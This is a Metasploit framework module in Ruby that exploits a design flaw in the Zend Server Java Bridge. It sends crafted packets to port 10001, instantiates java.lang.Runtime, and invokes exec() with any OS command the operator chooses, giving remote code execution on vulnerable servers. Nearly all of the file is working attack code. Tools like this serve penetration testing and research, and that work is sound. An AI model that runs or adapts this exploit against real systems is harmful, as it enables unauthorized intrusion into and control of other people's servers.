##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zend Server Java Bridge Design Flaw Remote Code Execution',
      'Description'    => %q{
          This module abuses a flaw in the Zend Java Bridge Component of
        the Zend Server Framework. By sending a specially crafted packet, an
        attacker may be able to execute arbitrary code.

        NOTE: This module has only been tested with the Win32 build of the software.
      },
      'Author'         => [ 'ikki', 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '71420'],
          [ 'ZDI', '11-113' ],
          [ 'EDB', '17078' ],
        ],
      'DisclosureDate' => 'Mar 28 2011'))

    register_options(
      [
        Opt::RPORT(10001),
        OptString.new('CMD', [ false, 'The OS command to execute', 'cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt']),
      ], self.class)
  end

  def run

    cmd = datastore['CMD']

    connect

    java_object =  [0x33000000].pack('V') + [0x00000000].pack('V')
    java_object << [0x0c000000].pack('V') + "CreateObject"
    java_object << [0x02000000].pack('V') + [0x00000004].pack('V')
    java_object << "\x11" + "java.lang.Runtime" + "\x07"
    java_object << [0x00000000].pack('V')

    print_status("Creating the Java Object 'java.lang.Runtime'")
    sock.put(java_object)
    res = sock.get_once() || ''
    classid = res[5,4]

    runtime =  [0x16000000].pack('V') + classid + [0x0a000000].pack('V')
    runtime << "getRuntime" + [0x00000000].pack('V')

    print_status("Invoking static method 'getRuntime()'")
    sock.put(runtime)
    res = sock.get_once() || ''
    methodid = res[5,4]

    exec =  [0x00].pack('n') + [21 + cmd.length].pack('n') + methodid
    exec << [0x04000000].pack('V') + "exec" + [0x01000000].pack('V')
    exec << "\x04" + [0x00].pack('n') + [cmd.length].pack('n') + cmd

    print_status("Invoking method 'exec()' with parameter '#{cmd}'")
    sock.put(exec)
    success = sock.get_once() || ''
    if (success =~ /\x00\x00\x00/)
      print_status("Cleaning up the JVM")
      rm =  [0x11000000].pack('V') + [0xffffffff].pack('V')
      rm << [0x05000000].pack('V') + "reset"
      rm << [0x00000000].pack('V')
      sock.put(rm)
    else
      print_error("Failed to run command...")
      disconnect
      return
    end

    disconnect

  end

end
